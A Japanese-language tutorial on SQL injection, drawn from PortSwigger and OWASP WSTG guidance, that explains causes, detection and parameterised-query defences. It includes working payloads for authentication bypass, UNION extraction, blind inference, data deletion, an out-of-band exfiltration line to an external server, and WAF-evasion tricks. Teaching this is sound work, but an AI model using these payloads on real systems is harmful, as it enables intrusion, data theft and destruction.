### 1. What is SQL Injection — 定義と全体像

#### 1.1 SQLインジェクションとは何か

PortSwiggerはSQLiを次のように定義している。

> "SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database."

日本語にすると「アプリケーションがデータベースに対して発行するクエリに、攻撃者が干渉できてしまうWebセキュリティ上の脆弱性」である。ポイントは「干渉（interfere）」という言葉が示す通り、SQLi自体は特定の攻撃手法を指すのではなく、**アプリケーションが組み立てるSQL文の構造そのものを攻撃者が変更できてしまう状態**を指す包括的な脆弱性クラスだという点である。この「クエリの構造を変える」という一点が以降すべての章（UNION攻撃、blind SQLi、second-order SQLiなど）に通底する原理になる。

SQLiが成立すると、通常は閲覧できないはずのデータの閲覧、他ユーザーとして振る舞う認証バイパス、データの改ざん・削除、さらにはデータベースサーバーそのものへの侵害（OSコマンド実行に繋がるケースを含む）や、それを足がかりとしたDoS攻撃まで発展しうる。つまりSQLiは「情報漏えい」で終わる脆弱性ではなく、**アプリケーションが持つ権限をそのまま攻撃者に貸し与えてしまう**性質のものであると理解しておく必要がある。

#### 1.2 脆弱性が生まれる仕組み：文字列連結によるクエリ構築

PortSwiggerが挙げている典型的な脆弱コードは以下である（Java／JDBCの例）。

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

> 出典: What is SQL Injection (SQLi)? — https://portswigger.net/web-security/sql-injection

ここで`input`はユーザーが指定したカテゴリ名で、通常のリクエストでは以下のようなクエリが発行される。

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

`released = 1`は「一般公開済みの商品だけを表示する」というアプリケーション側の業務ロジック（未公開商品を隠す）を実装したものである。ここで攻撃者が`input`に`Gifts'--`を渡すと、クエリは次のように変化する。

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

**なぜこれで`released = 1`の条件が無効化されるのか。** SQLの多くの方言では`--`は行コメントの開始を意味する。パーサはこの`--`以降をトークンとして解釈せず読み捨てるため、後続の` AND released = 1`は構文木に一切現れなくなる。つまり攻撃者はSQL文全体を書き換えたのではなく、**文字列リテラルの終端であるシングルクォートを1個自分で注入し、その後ろに自分のSQL断片（コメント開始トークン）を継ぎ足す**ことで、パーサに「ここでWHERE句は終わり」と誤認させている。これがSQLiの最も基本的な原理であり、「文字列連結でクエリを組み立てる」という実装上の選択が、ユーザー入力とSQL構文を区別できないという構造的欠陥を生んでいることが分かる。

同様の原理で、ログインフォームのユーザー名欄に`administrator'--`を入力すると、後続のパスワード比較条件がコメントアウトされ、パスワードを知らなくても`administrator`としてログインできてしまう（認証ロジックのバイパス）。記事ではこれも代表例として挙げられている。

#### 1.3 脆弱性が発生しうる箇所

SQLiはログインフォームのようなユーザー入力欄に限らない。PortSwiggerは以下のような箇所すべてが注入点になりうるとしている。

- URLパラメータ（クエリ文字列）
- POSTボディのフィールド
- HTTPヘッダー（`User-Agent`、`Referer`、`X-Forwarded-For`など、アプリケーションがログ記録やアクセス制御のためにDBへ書き込む場合）
- Cookie
- JSON/XML形式のリクエストボディ

JSON・XML経由の場合は、WAFやフィルタの単純な文字列検知を迂回するために**文字参照エンコード**が使われることがある。記事ではXMLの例として次が挙げられている。

```xml
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
```

`&#x53;`は文字`S`のXML数値文字参照である。XMLパーサはこれをデコードしてから後段のSQL処理に渡すため、**入力段階の文字列マッチングでは`SELECT`という語が見えず、デコード後の実行時になって初めて`SELECT`が出現する**。これは「なぜ単純な禁止語フィルタでは防げないか」という後の防御章に直結する重要な仕組みである。フィルタがどの処理段階（デコード前／後）で動くかによって、同じペイロードが検知されたりされなかったりする。

さらに、SQL文中でも注入が起こりうる場所は`WHERE`句だけではない。`UPDATE`文の更新値、`INSERT`文の挿入値、さらにはテーブル名やカラム名を動的に組み立てている場合はその部分、`ORDER BY`句の並び替えキーなど、アプリケーションが動的にSQL文の一部を組み立てている箇所はすべて潜在的な注入点になる。

#### 1.4 攻撃手法の分類

記事は主要なSQLi攻撃パターンを整理している。

1. **隠しデータの取得**: 前述の`released = 1`条件の無効化のように、業務ロジック上の絞り込み条件を無効化して非公開データを表示させる。
2. **アプリケーションロジックのバイパス**: 認証・認可チェックをコメントアウトする。
3. **UNION攻撃**: `UNION SELECT`を使い、本来のクエリの結果セットに攻撃者が指定した別テーブルのデータ（ユーザー名・パスワードハッシュなど）を結合して取得する。例: `' UNION SELECT username, password FROM users--`。この手法はレスポンスに結果がそのまま表示される（in-band）ケースで極めて強力である。
4. **ブラインドSQLi（Blind SQLi）**: アプリケーションがクエリ結果を画面に表示しない場合に使う手法群。条件分岐によるレスポンス差異（`AND 1=1`と`AND 1=2`でレスポンス内容やステータスコードが変わるかを観察）、条件付きエラー（エラーの有無で真偽を判定）、タイムディレイ（`SLEEP()`等でレスポンス時間を意図的に変化させ真偽を判定）、そしてOAST（Out-of-Band Application Security Testing、DNSやHTTPの帯域外通信を使ってデータを外部に持ち出す手法）に分けられる。
5. **セカンドオーダーSQLi（second-order SQLi）**: あるリクエストで入力された値がいったんDBに安全に保存された後、**別の処理**でその値が安全でない形で別のクエリに組み込まれてしまうケース。1回目の入力時点の文字列エスケープだけでは、2回目の利用時の危険性を消せないことが要点である。

#### 1.5 検出方法

手動での基本的な検出手順として記事は以下を挙げている。

- シングルクォート`'`を送り、エラーやレスポンス変化が起きるか確認する
- SQL固有の構文（真偽が変わる論理式など）を送って挙動を比較する（`OR 1=1`と`OR 1=2`など）
- ブール条件を使ってTrue/Falseに応じたレスポンス差異を確認する
- タイムディレイのペイロードを送り、レスポンス時間の変化を見る
- OASTペイロードを送り、外部リスナーへのコールバックの有無を確認する

自動検出についてはBurp Scannerのような専用ツールでの網羅的スキャンが有効であるとしている。人手によるテストは注入点の発見と仮説検証に向き、自動スキャナは広範囲のエンドポイントに対する網羅的な一次スクリーニングに向く、という役割分担で理解するとよい。

#### 1.6 防御方法

**最も重要な対策はパラメータ化クエリ（prepared statement）の使用**であるとされている。前掲の脆弱なコードに対応する安全な実装は次の通り。

```java
PreparedStatement statement = connection.prepareStatement
("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

> 出典: What is SQL Injection (SQLi)? — https://portswigger.net/web-security/sql-injection

**なぜパラメータ化クエリで防げるのか。** 文字列連結の場合、SQLエンジンに渡される段階ではユーザー入力もSQL構文も区別のない1本のテキストになっている。パーサはその全体を字句解析するため、入力に紛れ込んだ`'`や`--`もクエリ構文の一部として解釈されてしまう。一方パラメータ化クエリでは、まず`?`というプレースホルダを含んだ**クエリの構文木（実行計画）だけ**をDBエンジンに送ってコンパイルさせ、その後でユーザー入力を「値」として別チャネルでバインドする。DBエンジン側では、この時点でクエリの構造はすでに確定済みであり、バインドされる値がどんな文字列であっても**構文としては再解釈されず、常にリテラルな値として扱われる**。つまりSQLiが起こる根本原因（入力とコードの区別がつかないこと）を、実行モデルのレベルで構造的に排除しているのがパラメータ化クエリである。

一方で、テーブル名やカラム名、`ORDER BY`のソートキーなど、**値ではなく識別子（クエリの構造そのもの）を動的に変える必要がある**箇所にはプレースホルダを使えない（バインド変数はあくまで「値」の差し込み用であり、識別子やキーワードの差し込みには使えないため）。この場合の対策としてPortSwiggerは、ユーザー入力を許可されたテーブル名・カラム名のホワイトリストと照合し、一致したものだけを使う設計を推奨している。任意の文字列を直接組み込む設計そのものを避けるのが要点である。

またWAF（Web Application Firewall）については、シグネチャベースの検知は前述のエンコーディング回避などで比較的容易にすり抜けられるため、**唯一の防御層にしてはならない**という含意がある。防御の本丸はあくまでアプリケーションコード側（パラメータ化・ホワイトリスト検証・最小権限のDB接続アカウント）に置くべきである。

> ⚠️ 本節の記事全文はPortSwiggerサイト上で継続的に更新されている。バージョン固有のCVEやDBMS個別の構文差異はチートシート等の後続資料で扱う。ここで示した原理（文字列連結 vs. パラメータ化）自体は特定バージョンに依存しない普遍的な仕組みである。

## OWASPによる定義とテスト方法論

SQLインジェクション（以下SQLi）を体系的に学ぶうえで、まず押さえておくべきなのはOWASP（Open Worldwide Application Security Project）による「公式な定義」と、実際にペネトレーションテスターが現場で使う「テスト方法論」の2つである。前者はSQLiが何であり、なぜ起こり、何が危険なのかという概念的な土台を与え、後者はその概念を実際の診断作業へと落とし込む手順書にあたる。本節ではこの2つの資料——OWASP CommunityページのSQL Injection解説と、OWASP Web Security Testing Guide（WSTG）のTesting for SQL Injection（WSTG-INPV-05、現行版ではWSTG-INJT-05に再分類）——を原典に忠実に読み解く。

### SQLiの定義と発生原理

> 出典: SQL Injection — https://owasp.org/www-community/attacks/SQL_Injection

OWASPはSQLiを次のように定義する。

> 「SQLインジェクション攻撃とは、クライアントからアプリケーションへの入力データを介して、SQLクエリを『注入（inject）』することである。」

この一文の核心は「入力データ」と「SQLクエリ」という、本来まったく別の役割を持つものが混ざり合ってしまう点にある。SQLはもともと「制御（どんな命令を実行するか）」と「データ（何を対象にするか）」を明確に分離する言語として設計されている。ところが実装上は、多くのアプリケーションが文字列連結によって動的にSQL文を組み立てる。このとき、ユーザーが入力した「データ」の一部が、パーサ（SQL構文解析器）からは「制御」の一部として読み取られてしまう瞬間が生じる。これがSQLiの本質である。

OWASPはこの脆弱性が成立する条件を2つに整理している。

1. **信頼できないソースからデータが入ってくること**（untrusted sourceからのデータ流入）
2. **そのデータが動的にSQL文を構築するために使われること**

この2条件がそろって初めてSQLiという「sink（入力が最終的に実行・解釈される危険な代入先）」に到達する。逆に言えば、外部入力を一切使わない静的なSQL文や、入力を構文解析器に渡す前に適切に分離しておく仕組み（後述するプレースホルダ）があれば、この経路は断たれる。

#### 制御面とデータ面の混同という視点

OWASPの記述をもう一段掘り下げると、「メタキャラクタ（`'`、`;`、`--`など、SQL構文上特別な意味を持つ文字）」を入力に含めることで、パーサに対して「ここからは制御だ」と誤認させる点が攻撃の仕組みである。たとえば次のC#のコード例がOWASP原文に示されている。

```csharp
string query = "SELECT * FROM items WHERE owner = '"
                + userName + "' AND itemname = '"
                + ItemName.Text + "'";
```

ここで`ItemName.Text`にユーザーが次の文字列を入力したとする。

```
name' OR 'a'='a
```

すると最終的に構築されるSQL文は次のようになる。

```sql
... WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a'
```

一見すると`itemname = 'name'`という単なる文字列比較に見えるが、閉じクォート`'`によって文字列リテラルが強制終了させられ、続く`OR 'a'='a'`が独立した論理式としてパーサに解釈される。SQLの演算子優先順位ではANDがORより先に評価されるため、この式は事実上「常に真」になる条件を作り出し、`WHERE`句によるアクセス制御全体を無効化してしまう。これが「制御面とデータ面の混同」という表現の具体的な意味である。パーサ自身には「これはユーザー入力だから危険」という区別をつける手段がなく、文字列としてクォートが閉じているかどうかしか見ていない。

さらに破壊的な例として、OWASPは次のペイロードも挙げている。

```
name'); DELETE FROM items; --
```

セミコロンによる文の区切りをサポートするDBMS・APIの組み合わせ（いわゆるスタックドクエリ、後述）では、これによって元のSELECT文に続けて独立した`DELETE`文が実行され、テーブル全体のデータが消去される可能性がある。`--`は以降の文字列をコメントとして無効化するためのテクニックで、元のSQL文の残り（閉じ括弧やクォート）による構文エラーを防ぐ役割を持つ。

### 影響（インパクト）の分類——CIA+Aの4分類

OWASPはSQLiによって侵害されうるセキュリティ特性を4つに整理している。これはCIA三要素（機密性・完全性・可用性）に「認可（Authorization）」を加えた実務的な分類であり、影響評価（トリアージ）の際の基準として非常に有用である。

| 特性 | 侵害の内容 |
|---|---|
| 機密性（Confidentiality） | データベースへの不正アクセスによる機密データの窃取 |
| 認証（Authentication） | 正規の資格情報を持たずにログイン機構を突破する |
| 認可（Authorization） | データベースに保存されたアクセス制御情報自体を改ざんする |
| 完全性（Integrity） | 重要な情報の改ざん・削除 |

さらに帰結として、なりすまし（identity spoofing）、データ改ざん、管理者権限の奪取、そして条件がそろえばOSコマンド実行にまで発展しうる、とOWASPは明記している。これはSQLiが「データベースだけの問題」に留まらず、アプリケーション層の認証・認可をも迂回し、最終的にはホストOSへの侵入経路になりうることを示している。実際、後述するWSTGのDBMS別ガイド（SQL Server編）では、`xp_cmdshell`という拡張ストアドプロシージャを悪用してOSコマンドを実行する具体的な手口が解説されている。

### リスク要因——「どこで起こりやすいか」

OWASP原文は、SQLiが特定のプラットフォームに依存しない（DBMSと通信するあらゆるシステムで起こりうる）としつつも、実務上の傾向として次を挙げている。

- **多発する環境**: PHPやASPで書かれたアプリケーション。歴史的に生SQLを文字列連結で組み立てる実装が多かったため。
- **比較的少ない環境**: J2EEやASP.NET。これはプリペアドステートメントやORM（Object-Relational Mapping、オブジェクトとリレーショナルDBのレコードを対応付ける層）を使った安全なデータアクセスAPIが標準的に整備されてきた歴史的経緯による。
- **深刻度**: 「high-impact」に分類される。
- **検出・悪用の容易さ**: 「The flaw is easily detected, and easily exploited（この欠陥は容易に発見され、容易に悪用される）」とOWASPは明記している。この一文は、SQLiが専門的なゼロデイ研究を必要とせず、基礎的な手法だけで広く再現可能な脆弱性クラスであることを端的に表している。

### なぜ「よくある対策」だけでは不十分なのか

OWASP原文が特に強調しているのは、直感的に「対策になりそうだが実は不十分」な手法についての警告である。

**入力バリデーション／ブラックリスト方式**: 危険な文字列パターン（`'`や`OR 1=1`など）をブロックする方式は、攻撃者がクォートを使わない注入（数値コンテキストでの注入など）、エスケープ処理の癖を突いた回避、あるいはストアドプロシージャ経由の別経路によって容易にバイパスされるため、根本的な防御にはならない。

**ストアドプロシージャ**: 「ストアドプロシージャは一部のSQLi攻撃を防げるが、多くの攻撃を防げない」とOWASPは明言している。ストアドプロシージャ自体が内部で動的SQLを文字列連結によって組み立てていれば、結局同じ脆弱性を内包してしまう（この点はWSTGの「Stored Procedure Injection」の節でも具体例とともに解説されている）。

**手動での文字エスケープ**: DBMSごとにエスケープ規則が微妙に異なり、エンコーディングの扱いや二重エスケープの考慮漏れなど、実装者が全パターンを正しく網羅するのは現実的に困難であるため、包括的な防御策にはなり得ない。

OWASPが推奨する真の対策は、パラメータ化クエリ（プレースホルダ）による制御面とデータ面の構造的な分離である。原文には次のJavaの安全な実装例が示されている。

```java
String query = "SELECT id, firstname, lastname FROM authors "
                + "WHERE firstname = ? and lastname = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, firstname);
pstmt.setString(2, lastname);
```

なぜこれが根本的解決になるのか。`prepareStatement`が呼ばれた時点で、DBMSドライバはSQL文のテンプレート（構文木）を先に構築・コンパイルする。その後`setString`で渡された値は、コンパイル済みのプレースホルダに「値そのもの」として代入されるのであって、SQL文字列として再パースされることはない。つまりユーザー入力がSQLパーサを通過する機会自体が存在しないため、たとえ入力に`'`や`--`が含まれていても、それは単なる文字データとして扱われ、構文木を書き換える余地がない。これが「制御面とデータ面の分離」の具体的な実装である。この原理は本教科書の防御パートで扱う各種フレームワークのプリペアドステートメントAPIすべてに共通する核心原理であり、ここで理解しておくことが後続章の土台になる。

なお、この記事は関連する攻撃手法へのリンク（Blind SQL Injection、SQL Injection Bypassing WAF、Code Injection、ORM Injectionなど）を提供しており、OWASPのドキュメント群が相互参照によって体系化されていることも実務上覚えておくとよい。

### WSTGによるテスト方法論（WSTG-INPV-05 / 現行WSTG-INJT-05）

> 出典: Testing for SQL Injection — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/05-Testing_for_SQL_Injection （現行のリポジトリ構成では `4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection.md`、識別子はWSTG-INJT-05。以前のバージョンではInput Validation Testingカテゴリの下でWSTG-INPV-05として番号付けされていた。章立ての再編は2023年前後のWSTGメジャー改訂で行われており、リンク切れに遭遇した場合はこの再編が原因であることが多い）

WSTG（Web Security Testing Guide）は、OWASPが公開しているWebアプリケーション診断の標準的な方法論集である。個々の脆弱性クラスごとに「Summary（概要）」「Test Objectives（テストの目的）」「How to Test（具体的な手順）」「Remediation（是正策）」「Tools（ツール）」「References（参考文献）」という共通の型でまとめられており、SQLiの章もこの型に従う。ここではプロのテスターが実際にどう手を動かすかという方法論の骨格を、原典の構成に沿って解説する。

#### テストの目的

WSTGはSQLiテストの目的を次の2点に集約している。

1. SQLインジェクションが可能な注入ポイントを特定する
2. その注入の深刻度と、そこから到達可能なアクセスレベルを評価する

これは単に「脆弱性があるか/ないか」の二値判定ではなく、「どこまで到達できるか」を評価することがプロのテストの本質であることを示している。読み取り専用の情報漏えいなのか、書き込み（INSERT/UPDATE/DELETE）が可能なのか、DBMS管理コマンドが実行できるのか、ファイルシステムへの読み書きが可能なのか、最終的にOSコマンド実行に至るのか——この段階評価がレポートの価値を決める。

#### 攻撃の3分類——inband・out-of-band・inferential(blind)

WSTGはSQLi攻撃を、データをどう取り出すかという観点で3つに分類している。これはテスト戦略を選択する際の最初の分岐点になる。

- **Inband（帯域内）**: 注入に使ったのと同じチャネルでデータを抽出する方式。もっとも直接的で、取得したデータがそのままアプリケーションのレスポンス（Webページ）に表示される。
- **Out-of-band（帯域外）**: 別のチャネルでデータを取得する方式。たとえばDBMS関数を使ってテスター管理下のサーバーへHTTPリクエストやDNSクエリを送出させ、そこにクエリ結果を埋め込ませる。アプリケーションのレスポンスに変化が出ない、あるいは出せない状況で有効になる。
- **Inferential（推論型）／Blind（ブラインド）**: 実際のデータ転送は発生しない。テスターは特定のリクエストを送り、その結果として現れるサーバーの「挙動の違い」（真偽の分岐、レスポンス時間の差など）を観測することで、間接的に情報を再構成する。

さらに、これらを実現する具体的な技術としてWSTGは5つの実装手法を挙げている。ユニオン演算子（UNION Operator）、ブーリアン（Boolean）、エラーベース（Error-based）、帯域外（Out-of-band）、そして時間遅延（Time delay）である。重要なのは、これらは互いに排他的ではなく、たとえばユニオン演算子と帯域外技術を組み合わせるといった複合的な使い方もあり得るとWSTGが注記している点である。

#### 検出フェーズ（Detection Techniques）

テストの第一歩は、アプリケーションがどこでDBサーバーと対話しているかを特定することである。WSTGは典型的な例として、認証フォーム（ユーザー名・パスワードをDB内のレコードと照合する）、検索エンジン（検索文字列がクエリの一部に組み込まれる）、ECサイト（商品情報がDBに格納されている）を挙げている。テスターはPOSTの隠しフィールド、HTTPヘッダ、Cookieに至るまで、SQLクエリの構築に使われうる全入力箇所を洗い出し、1つずつ個別にテストする（他の変数を固定し、1変数だけを変化させる——これは因果関係を明確にするための基本原則である）。

最初のテストとして推奨されるのは、単純にシングルクォート`'`やセミコロン`;`を注入することである。`'`はSQLにおける文字列終端記号であり、フィルタされていなければ構文エラーを引き起こす。`;`は文の終端記号であり、これもフィルタされていなければエラーを誘発する。WSTG原文には次のようなMicrosoft SQL Serverのエラーメッセージ例が示されている。

```
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

また、数値を期待するパラメータに文字列を注入する単純な手法でも、型変換エラーとして脆弱性が露呈することがある。

```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
```

WSTGはさらに、エラーメッセージがユーザーに直接表示されなくても、HTML/JavaScriptのソースコード中にコメントやJS変数として埋め込まれたまま残存していることがあるため、レスポンス全体を丹念に確認する重要性を説いている。エラーが一切表示されないアプリケーション（汎用の500エラーやカスタムエラーページのみを返す）では、後述のブラインド手法に頼らざるを得ない。

#### 標準的なテスト手法

**1. クラシックなSQLインジェクション（認証バイパス）**

典型的な認証クエリを想定する。

```sql
SELECT * FROM Users WHERE Username='$username' AND Password='$password'
```

ここに次の値を注入する。

```
$username = 1' or '1' = '1
$password = 1' or '1' = '1
```

構築される最終クエリは次のようになる。

```sql
SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'
```

`'1'='1'`は常に真であるため、`WHERE`句全体が実質的に真となり、認証を経ずに（多くの場合テーブルの先頭行、すなわち管理者アカウントであることが多いとWSTGは注記している）ログインが成立してしまう。

なお、WSTGは重要な注意書きを添えている。「`OR 1=1`のような条件を注入する際は注意が必要である。この条件が最初に注入した文脈では無害に見えても、同じリクエストのデータが別のUPDATE文やDELETE文でも再利用されるアプリケーションは珍しくなく、その場合は意図しないデータ損失を招く可能性がある」。診断作業においてこの注記は極めて実務的であり、破壊的なペイロードを不用意に本番環境へ投げることの危険性を示している。

括弧やハッシュ関数を含むより複雑なクエリの例も示されている。

```sql
SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))
```

このケースでは2つの課題がある。開き括弧の数を合わせる必要があること、そしてMD5ハッシュ比較を回避する必要があることである。後者への対処として、コメント区切り記号（多くのDBMSでは`/* */`、Oracleでは`--`）を使い、それ以降の条件式全体を無効化する。

```
$username = 1' or '1' = '1'))/*
$password = foo
```

これにより最終的なクエリでは、パスワード条件がコメントアウトされて評価されなくなる。加えて、アプリケーションが「返却レコードがちょうど1件であること」を認証条件にしている場合、`LIMIT 1`を注入して意図的に結果を1件に絞り込むテクニックも紹介されている。

**2. SELECT文への注入とAND/ORによる真偽判定**

```sql
SELECT * FROM products WHERE id_product=$id_product
```

に対し、`id=10 AND 1=2`（常に偽）と`id=10 AND 1=1`（常に真）をそれぞれ送信し、レスポンスの差異（コンテンツの有無、エラーの有無）を比較することで、パラメータが注入可能かどうかを判定する。これは後述のブラインドSQLiの基礎となる考え方でもある。

**3. スタックドクエリ（Stacked Queries）**

利用しているAPIとDBMSの組み合わせ（例: PHP+PostgreSQL、ASP+SQL Server）によっては、1回の呼び出しで複数のクエリを連続実行できる場合がある。

```
https://www.example.com/product.php?id=10; INSERT INTO users (…)
```

これにより、元のSELECT文とは独立した任意のクエリを注入・実行できる可能性がある。ただし、MySQLの多くの標準API（`mysql_query`など）はデフォルトでスタックドクエリを許可しないなど、DBMS/ドライバ依存の挙動である点に注意が必要である。

#### DBMSのフィンガープリンティング

高度な悪用に進む前に、バックエンドDBMSの種類を特定することが重要になる。WSTGはエラーメッセージの違いを利用する方法を示している。

```
MySQL: You have an error in your SQL syntax; check the manual that corresponds
       to your MySQL server version for the right syntax to use near '\'' at line 1

Oracle: ORA-00933: SQL command not properly ended

PostgreSQL: Query failed: ERROR: syntax error at or near "'" at character 56
```

エラーメッセージが出ない場合は、文字列連結構文の違い（DBMSごとに異なる）を利用した識別も可能である。

| DBMS | 文字列連結構文 |
|---|---|
| MySQL | `'test' + 'ing'` |
| SQL Server | `'test' 'ing'`（隣接文字列の自動連結） |
| Oracle | `'test'\|\|'ing'` |
| PostgreSQL | `'test'\|\|'ing'` |

この違いを突いて、特定の構文でのみエラーが起きない（＝正常応答が返る）ことを観測すれば、バックエンドDBMSを推測できる。

#### 悪用（Exploitation）技術

**ユニオンベース技術**

`UNION`演算子は、SELECT文に対するSQLi欠陥がある場合に、テスターが自作したクエリの結果を元のクエリの結果セットへ結合するために使われる。

```sql
SELECT Name, Phone, Address FROM Users WHERE Id=1
UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

`ALL`キーワードは、元のクエリが`DISTINCT`を使っている場合に重複除去で結果が消えてしまうことを避けるために付与される。`UNION`を成立させるための2大前提は、(1)両クエリの列数が一致すること、(2)対応する列のデータ型に互換性があることである。WSTGはこの列数・型を特定する手順を具体的に示している。

列数の特定には`ORDER BY`を使う。

```
https://www.example.com/product.php?id=10 ORDER BY 10--
```

これが成功すれば列数は10以上、失敗すれば（`Unknown column '10' in 'order clause'`のようなエラーが出れば）10未満だと分かる。二分探索的に列数を絞り込める。

列の型特定には、`NULL`は任意の型と互換性があるという性質を利用する。

```
https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--
```

型が合わない列があれば`All cells in a column must have the same datatype`のようなエラーが出るため、1列ずつ`NULL`を実際の値の型（整数や文字列）に置き換えていくことで、どの列が文字列データの表示に使えるかを特定する。

また、アプリケーションが結果セットの最初の行しか表示しない実装になっている場合、`id=99999`（存在しないID）を指定して元のクエリの結果を意図的に0件にし、UNIONで注入した行だけを表示させるテクニックも有効である。

**ユニオンが直接使えない場合（Hidden Union Exploitation）**

WSTGは実務でよく直面する、より込み入ったケースにも触れている。脆弱なクエリがサブクエリの内部にある場合、エイリアスや変数宣言を含む複雑なクエリの場合、脆弱なクエリの結果が別の第2クエリに渡されて初めてデータが返却される場合、同じ入力値が複数の独立したクエリで使い回されている場合——これらのシナリオでは単純に`UNION ... --`を末尾に付けるだけでは元のクエリ構造を壊してしまい、データを取得できない。WSTGはこれに対し、バックエンドで実際に実行されているクエリ自体を（`INFORMATION_SCHEMA.PROCESSLIST`（MySQL）、`pg_stat_activity`（PostgreSQL）、`sys.dm_exec_cached_plans`（SQL Server）、`V$SQL`（Oracle）といったDBMS管理ビューから）割り出し、その構造に合わせてペイロードを組み立てる、あるいはSQLMapのようなツールでブラインド注入を使って原クエリを抽出したうえでユニオン注入を自動化する、という高度な手法を紹介している。これは「テンプレート化されたペイロードをそのまま当てはめるだけでは通用しない」現実の診断業務の複雑さを示す重要な内容である。

**ブーリアン（Boolean）ブラインド技術**

エラーメッセージも表示内容の差異もない、あるいは限定的にしか観測できない「Blind SQL Injection」状況で有効な手法である。`SUBSTRING`、`ASCII`、`LENGTH`といったDBMS標準関数を使い、目的の値（例: `username`カラムの値）を1文字ずつ推論する。

```sql
$Id = 1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1
```

このクエリは、`username`の1文字目のASCIIコードが97（すなわち`a`）である場合にのみ真になる。アプリケーションの応答が「真の場合のテンプレート」と一致するかどうかを、あらかじめ確立しておいた「常に偽になるクエリ」（`1' AND '1' = '2`）のレスポンスと比較することで判定する。ASCIIコードを0〜255まで総当たりし、真になった時点で次の文字に進む。この繰り返しにより文字列全体を復元する。終了条件の判定には`LENGTH(username)=N`を使い、既知の文字数と一致するかどうかで文字列の終端を検出する。WSTGはこの手法が「高い頻度のクエリ送信」を要するため、実務では自動化ツールの利用がほぼ必須であると述べている。

**エラーベース技術**

DBMSにわざとエラーを起こさせ、そのエラーメッセージの中にデータそのものを埋め込ませて情報を抽出する手法である。Oracleの例が示されている。

```
https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
```

`UTL_INADDR.GET_HOST_NAME`はホスト名解決を試みる関数で、そこに渡された「ホスト名のはずの文字列」が実際には`SELECT user FROM DUAL`（現在のDBユーザー名を返すOracle特有のクエリ）の実行結果になっている。名前解決は当然失敗するが、そのエラーメッセージ（`ORA-292257: host SCOTT unknown`のような形式）に、失敗した「ホスト名」としてクエリ結果の値がそのまま含まれる。これがエラーベース技術の仕組みである——本来エラーを報告するための機構を、データ漏えいのチャネルとして転用している点が肝である。

**帯域外（Out-of-band）技術**

同じくブラインド状況で有効な手法だが、DBMS関数を使ってテスターが管理する外部サーバーへ能動的に接続させ、その接続先URLやリクエスト内容にクエリ結果を埋め込む。

```
https://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80'||(SELECT user FROM DUAL))--
```

`UTL_HTTP.request`（Oracle）はHTTPリクエストを発行する関数で、接続先ホスト名の一部にクエリ結果を連結することで、テスター側のサーバーのアクセスログにデータが記録される。WSTGはこれを受信するために、Apacheのようなフル機能のWebサーバーだけでなく、単純な`nc -nLp 80`（Netcatでリッスン）でも十分だと述べている。この技術は、アプリケーションのレスポンス自体には一切変化が出ない（＝完全なブラインド）状況でも、DBサーバーからテスターへの直接的な通信経路（多くは外向きの443/80ポートやDNS）さえ確保できれば有効という点で強力である。

**時間遅延（Time Delay）技術**

条件付きでDBMSに意図的な遅延を発生させ、レスポンス時間の差から真偽を判定する。

```
https://www.example.com/product.php?id=10 AND IF(version() like '5%', sleep(10), 'false'))--
```

MySQLの`IF`関数と`SLEEP()`関数を組み合わせ、バージョンが5系であるかどうかを条件に、真であれば10秒のスリープを発生させる。レスポンスに10秒の遅延が観測されれば条件は真、即座に返答があれば偽と判定する。WSTGは実務上のコツとして、遅延時間を意図的に大きく（例: 100秒）設定し、実際にはその応答を待たずに数秒後にリクエストをキャンセルしてもよい、と述べている——遅延の発生自体が確認できれば十分だからである。

**ストアドプロシージャインジェクション**

ストアドプロシージャ内部で動的SQLを組み立てる際に適切なサニタイズがなければ、同様にSQLiが成立する。WSTGはSQL Serverの例を示している。

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring = '
Select 1 from users
Where username = ' + @username + ' and passwd = ' + @passwd
exec(@sqlstring)
Go
```

このプロシージャは入力をまったくサニタイズしておらず、`EXEC()`で動的に文字列を実行する時点で、通常のSQLi対策（呼び出し側でのプレースホルダ使用など）を素通りしてしまう危険な設計である。ストアドプロシージャの利用自体が安全性を保証するわけではないという、OWASP Communityページの主張を具体的に裏づける実例になっている。

#### シグネチャ回避（WAF/IPSバイパス）技術

WSTGは、WAF（Web Application Firewall）やIPS（侵入防止システム）を回避するための代表的なテクニックも列挙している。これらは「フィルタは構文的パターンマッチに依存しがちである」という弱点を突くものである。

- **空白操作**: 余分な空白の除去・追加、改行やタブへの置換（`or 'a'='a'` → `or\n'a'=\n'a'`）
- **NULLバイト**: `%00`をフィルタ対象文字の前に挿入し、文字列処理系の解釈を分岐させる
- **SQLインラインコメント**: `/**/`でキーワード間を分断し、単純な文字列一致フィルタを回避する（`UNION/**/SELECT/**/password`）
- **URLエンコード**: `%27`（`'`）のようにエンコードしてフィルタをすり抜ける
- **文字エンコード（CHAR関数）**: `char(114,111,111,116)`のようにASCIIコードの並びで文字列を表現し、`root`という文字列そのものをペイロードに含めない
- **文字列連結**: `EXEC('SEL' + 'ECT 1')`のようにキーワード自体を分割し、単純なキーワードマッチを回避する
